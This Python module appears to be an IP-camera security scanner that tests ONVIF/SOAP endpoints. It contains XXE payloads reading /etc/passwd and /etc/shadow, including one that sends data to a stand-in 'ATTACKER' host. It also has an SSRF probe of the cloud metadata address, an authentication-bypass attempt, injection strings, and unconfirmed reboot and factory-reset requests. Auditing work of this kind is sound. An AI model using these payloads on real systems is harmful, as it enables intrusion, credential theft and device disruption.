"""
ONVIF Protocol Auditor - Tests ONVIF/SOAP specific vulnerabilities.
Covers: XXE injection, SOAP action abuse, auth bypass, info disclosure.
"""

import socket
import ssl
import re
import hashlib
import base64
import time
from datetime import datetime


ONVIF_ACTIONS = [
    ("GetDeviceInformation", "http://www.onvif.org/ver10/device/wsdl/GetDeviceInformation"),
    ("GetCapabilities", "http://www.onvif.org/ver10/device/wsdl/GetCapabilities"),
    ("GetNetworkInterfaces", "http://www.onvif.org/ver10/device/wsdl/GetNetworkInterfaces"),
    ("GetSystemDateAndTime", "http://www.onvif.org/ver10/device/wsdl/GetSystemDateAndTime"),
    ("GetUsers", "http://www.onvif.org/ver10/device/wsdl/GetUsers"),
    ("GetProfiles", "http://www.onvif.org/ver10/media/wsdl/GetProfiles"),
    ("GetStreamUri", "http://www.onvif.org/ver10/media/wsdl/GetStreamUri"),
    ("GetSnapshotUri", "http://www.onvif.org/ver10/media/wsdl/GetSnapshotUri"),
    ("GetScopes", "http://www.onvif.org/ver10/device/wsdl/GetScopes"),
    ("GetServices", "http://www.onvif.org/ver10/device/wsdl/GetServices"),
    ("GetDNS", "http://www.onvif.org/ver10/device/wsdl/GetDNS"),
    ("GetNTP", "http://www.onvif.org/ver10/device/wsdl/GetNTP"),
    ("GetNetworkDefaultGateway", "http://www.onvif.org/ver10/device/wsdl/GetNetworkDefaultGateway"),
    ("SystemReboot", "http://www.onvif.org/ver10/device/wsdl/SystemReboot"),
    ("SetSystemFactoryDefault", "http://www.onvif.org/ver10/device/wsdl/SetSystemFactoryDefault"),
    ("CreateUsers", "http://www.onvif.org/ver10/device/wsdl/CreateUsers"),
]


class ONVIFAuditor:
    def __init__(self, target, port=80, timeout=5, verbose=0):
        self.target = target
        self.port = port
        self.timeout = timeout
        self.verbose = verbose
        self.findings = []
        self.onvif_path = "/onvif/device_service"

    def run(self):
        self._test_unauthenticated_actions()
        self._test_xxe_injection()
        self._test_wsse_bypass()
        self._test_replay_attack()
        self._test_soap_injection()
        self._test_information_disclosure()
        return self.findings

    def _send_soap(self, soap_body, path=None, action=None, headers_extra=None):
        path = path or self.onvif_path
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.timeout)

            if self.port in (443, 8443):
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                sock = ctx.wrap_socket(sock, server_hostname=self.target)

            sock.connect((self.target, self.port))

            envelope = (
                '<?xml version="1.0" encoding="UTF-8"?>'
                '<s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope"'
                ' xmlns:wsse="http://docs.oasis-open.org/wss/2004/01/'
                'oasis-200401-wss-wssecurity-secext-1.0.xsd"'
                ' xmlns:wsu="http://docs.oasis-open.org/wss/2004/01/'
                'oasis-200401-wss-wssecurity-utility-1.0.xsd"'
                ' xmlns:tt="http://www.onvif.org/ver10/schema"'
                ' xmlns:tds="http://www.onvif.org/ver10/device/wsdl"'
                ' xmlns:trt="http://www.onvif.org/ver10/media/wsdl">'
                '<s:Header></s:Header>'
                f'<s:Body>{soap_body}</s:Body>'
                '</s:Envelope>'
            )

            request = f"POST {path} HTTP/1.1\r\n"
            request += f"Host: {self.target}\r\n"
            request += "Content-Type: application/soap+xml; charset=utf-8\r\n"
            if action:
                request += f"SOAPAction: \"{action}\"\r\n"
            request += f"Content-Length: {len(envelope)}\r\n"
            if headers_extra:
                for k, v in headers_extra.items():
                    request += f"{k}: {v}\r\n"
            request += f"\r\n{envelope}"

            sock.send(request.encode())
            response = b""
            while True:
                try:
                    chunk = sock.recv(4096)
                    if not chunk:
                        break
                    response += chunk
                except socket.timeout:
                    break
            sock.close()

            return response.decode("utf-8", errors="replace")
        except (socket.timeout, socket.error, ssl.SSLError, OSError) as e:
            if self.verbose >= 2:
                print(f"    [i] ONVIF connection error: {e}")
            return None

    def _test_unauthenticated_actions(self):
        if self.verbose:
            print("    [i] Testing unauthenticated ONVIF actions...")

        for action_name, action_uri in ONVIF_ACTIONS:
            soap_body = f"<tds:{action_name}/>"
            if action_name in ("GetProfiles", "GetStreamUri", "GetSnapshotUri"):
                soap_body = f"<trt:{action_name}/>"

            response = self._send_soap(soap_body, action=action_uri)
            if not response:
                continue

            if "200 OK" in response and "Fault" not in response:
                severity = "critical" if action_name in (
                    "GetUsers", "GetStreamUri", "SystemReboot",
                    "CreateUsers", "SetSystemFactoryDefault"
                ) else "high"

                self.findings.append({
                    "type": "onvif_unauth_action",
                    "severity": severity,
                    "title": f"ONVIF {action_name} Without Authentication",
                    "description": f"ONVIF action {action_name} accessible without credentials",
                    "target": f"http://{self.target}:{self.port}{self.onvif_path}",
                    "evidence": f"Action: {action_name}, Response contains data (no Fault)"
                })
                if self.verbose:
                    print(f"    [+] Unauth access: {action_name} ({severity})")

    def _test_xxe_injection(self):
        if self.verbose:
            print("    [i] Testing ONVIF XXE injection...")

        xxe_payloads = [
            # External entity - file read
            (
                '<?xml version="1.0" encoding="UTF-8"?>'
                '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
                '<s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope">'
                '<s:Body><tds:GetDeviceInformation>&xxe;</tds:GetDeviceInformation></s:Body>'
                '</s:Envelope>'
            ),
            # Parameter entity
            (
                '<?xml version="1.0" encoding="UTF-8"?>'
                '<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/shadow">'
                '<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM \'http://ATTACKER/%xxe;\'>">'
                '%eval; %exfil;]>'
                '<s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope">'
                '<s:Body><tds:GetDeviceInformation/></s:Body>'
                '</s:Envelope>'
            ),
            # SSRF via entity
            (
                '<?xml version="1.0" encoding="UTF-8"?>'
                '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>'
                '<s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope">'
                '<s:Body><tds:GetDeviceInformation>&xxe;</tds:GetDeviceInformation></s:Body>'
                '</s:Envelope>'
            ),
        ]

        for i, payload in enumerate(xxe_payloads):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(self.timeout)
                sock.connect((self.target, self.port))

                request = (
                    f"POST {self.onvif_path} HTTP/1.1\r\n"
                    f"Host: {self.target}\r\n"
                    f"Content-Type: application/soap+xml\r\n"
                    f"Content-Length: {len(payload)}\r\n"
                    f"\r\n{payload}"
                ).encode()

                sock.send(request)
                response = b""
                while True:
                    try:
                        chunk = sock.recv(4096)
                        if not chunk:
                            break
                        response += chunk
                    except socket.timeout:
                        break
                sock.close()

                decoded = response.decode("utf-8", errors="replace")
                if any(x in decoded for x in ["root:", "daemon:", "nobody:", "meta-data"]):
                    self.findings.append({
                        "type": "onvif_xxe",
                        "severity": "critical",
                        "title": "ONVIF XXE Injection",
                        "description": f"XML External Entity injection successful (payload {i+1})",
                        "target": f"http://{self.target}:{self.port}{self.onvif_path}",
                        "evidence": decoded[:300]
                    })
                    print(f"    [!] CRITICAL: XXE injection successful!")
                    break
            except (socket.timeout, socket.error, OSError):
                pass

    def _test_wsse_bypass(self):
        """Test WS-Security token bypass techniques."""
        if self.verbose:
            print("    [i] Testing WS-Security bypass...")

        # Empty password digest
        nonce = base64.b64encode(b"\x00" * 16).decode()
        created = datetime.utcnow().strftime("%Y-%m-%dT%H:%M:%SZ")
        password_digest = base64.b64encode(
            hashlib.sha1(b"\x00" * 16 + created.encode() + b"").digest()
        ).decode()

        wsse_header = (
            '<s:Header>'
            '<wsse:Security>'
            '<wsse:UsernameToken>'
            '<wsse:Username>admin</wsse:Username>'
            f'<wsse:Password Type="http://docs.oasis-open.org/wss/2004/01/'
            f'oasis-200401-wss-username-token-profile-1.0#PasswordDigest">'
            f'{password_digest}</wsse:Password>'
            f'<wsse:Nonce>{nonce}</wsse:Nonce>'
            f'<wsu:Created>{created}</wsu:Created>'
            '</wsse:UsernameToken>'
            '</wsse:Security>'
            '</s:Header>'
        )

        envelope = (
            '<?xml version="1.0" encoding="UTF-8"?>'
            '<s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope"'
            ' xmlns:wsse="http://docs.oasis-open.org/wss/2004/01/'
            'oasis-200401-wss-wssecurity-secext-1.0.xsd"'
            ' xmlns:wsu="http://docs.oasis-open.org/wss/2004/01/'
            'oasis-200401-wss-wssecurity-utility-1.0.xsd"'
            ' xmlns:tds="http://www.onvif.org/ver10/device/wsdl">'
            f'{wsse_header}'
            '<s:Body><tds:GetUsers/></s:Body>'
            '</s:Envelope>'
        )

        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.timeout)
            sock.connect((self.target, self.port))

            request = (
                f"POST {self.onvif_path} HTTP/1.1\r\n"
                f"Host: {self.target}\r\n"
                f"Content-Type: application/soap+xml\r\n"
                f"Content-Length: {len(envelope)}\r\n"
                f"\r\n{envelope}"
            ).encode()

            sock.send(request)
            response = b""
            while True:
                try:
                    chunk = sock.recv(4096)
                    if not chunk:
                        break
                    response += chunk
                except socket.timeout:
                    break
            sock.close()

            decoded = response.decode("utf-8", errors="replace")
            if "200 OK" in decoded and "Fault" not in decoded and "User" in decoded:
                self.findings.append({
                    "type": "onvif_wsse_bypass",
                    "severity": "critical",
                    "title": "ONVIF WS-Security Authentication Bypass",
                    "description": "WS-Security accepted empty password digest",
                    "target": f"http://{self.target}:{self.port}{self.onvif_path}",
                    "evidence": "GetUsers succeeded with empty password digest"
                })
                print("    [!] CRITICAL: WS-Security bypass!")
        except (socket.timeout, socket.error, OSError):
            pass

    def _test_replay_attack(self):
        """Test if ONVIF accepts replayed/old timestamps."""
        if self.verbose:
            print("    [i] Testing ONVIF replay attack vectors...")

        # Use a timestamp far in the past
        old_created = "2020-01-01T00:00:00Z"
        nonce = base64.b64encode(b"replay_test_nonce1").decode()

        password_digest = base64.b64encode(
            hashlib.sha1(
                b"replay_test_nonce1" + old_created.encode() + b"admin"
            ).digest()
        ).decode()

        wsse_header = (
            '<s:Header>'
            '<wsse:Security>'
            '<wsse:UsernameToken>'
            '<wsse:Username>admin</wsse:Username>'
            f'<wsse:Password Type="http://docs.oasis-open.org/wss/2004/01/'
            f'oasis-200401-wss-username-token-profile-1.0#PasswordDigest">'
            f'{password_digest}</wsse:Password>'
            f'<wsse:Nonce>{nonce}</wsse:Nonce>'
            f'<wsu:Created>{old_created}</wsu:Created>'
            '</wsse:UsernameToken>'
            '</wsse:Security>'
            '</s:Header>'
        )

        envelope = (
            '<?xml version="1.0" encoding="UTF-8"?>'
            '<s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope"'
            ' xmlns:wsse="http://docs.oasis-open.org/wss/2004/01/'
            'oasis-200401-wss-wssecurity-secext-1.0.xsd"'
            ' xmlns:wsu="http://docs.oasis-open.org/wss/2004/01/'
            'oasis-200401-wss-wssecurity-utility-1.0.xsd"'
            ' xmlns:tds="http://www.onvif.org/ver10/device/wsdl">'
            f'{wsse_header}'
            '<s:Body><tds:GetSystemDateAndTime/></s:Body>'
            '</s:Envelope>'
        )

        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.timeout)
            sock.connect((self.target, self.port))

            request = (
                f"POST {self.onvif_path} HTTP/1.1\r\n"
                f"Host: {self.target}\r\n"
                f"Content-Type: application/soap+xml\r\n"
                f"Content-Length: {len(envelope)}\r\n"
                f"\r\n{envelope}"
            ).encode()

            sock.send(request)
            response = b""
            while True:
                try:
                    chunk = sock.recv(4096)
                    if not chunk:
                        break
                    response += chunk
                except socket.timeout:
                    break
            sock.close()

            decoded = response.decode("utf-8", errors="replace")
            if "200 OK" in decoded and "Fault" not in decoded:
                self.findings.append({
                    "type": "onvif_replay",
                    "severity": "high",
                    "title": "ONVIF Replay Attack Possible",
                    "description": "Camera accepts old timestamps - replay attacks possible",
                    "target": f"http://{self.target}:{self.port}{self.onvif_path}",
                    "evidence": f"Accepted timestamp from {old_created}"
                })
                if self.verbose:
                    print("    [+] Replay attack vector confirmed")
        except (socket.timeout, socket.error, OSError):
            pass

    def _test_soap_injection(self):
        """Test SOAP/XML injection vectors."""
        if self.verbose:
            print("    [i] Testing SOAP injection...")

        injections = [
            # CDATA injection
            '<tds:GetDeviceInformation><![CDATA[<tds:SystemReboot/>]]></tds:GetDeviceInformation>',
            # Namespace confusion
            '<tds:GetDeviceInformation xmlns:tds="http://evil.com/"/><tds:GetUsers/>',
            # XPath injection in filter
            '<tds:GetScopes><tds:ScopeFilter>\' or \'1\'=\'1</tds:ScopeFilter></tds:GetScopes>',
        ]

        for injection in injections:
            response = self._send_soap(injection)
            if response and "200 OK" in response and "Fault" not in response:
                self.findings.append({
                    "type": "onvif_soap_injection",
                    "severity": "high",
                    "title": "ONVIF SOAP Injection",
                    "description": "Camera processes injected SOAP content",
                    "target": f"http://{self.target}:{self.port}{self.onvif_path}",
                    "evidence": injection[:100]
                })
                if self.verbose:
                    print("    [+] SOAP injection accepted")

    def _test_information_disclosure(self):
        """Check for excessive information in ONVIF responses."""
        if self.verbose:
            print("    [i] Testing ONVIF information disclosure...")

        info_actions = [
            ("<tds:GetSystemDateAndTime/>", "SystemDateAndTime"),
            ("<tds:GetScopes/>", "Scopes"),
        ]

        for body, name in info_actions:
            response = self._send_soap(body)
            if response and "200 OK" in response and "Fault" not in response:
                # These are often accessible without auth by design
                sensitive = any(x in response for x in [
                    "firmware", "serial", "hardware",
                    "password", "token", "key"
                ])
                if sensitive:
                    self.findings.append({
                        "type": "onvif_info_disclosure",
                        "severity": "medium",
                        "title": f"ONVIF {name} Information Leak",
                        "description": f"Sensitive data exposed via {name} (no auth)",
                        "target": f"http://{self.target}:{self.port}{self.onvif_path}",
                        "evidence": f"{name} returns sensitive device info"
                    })
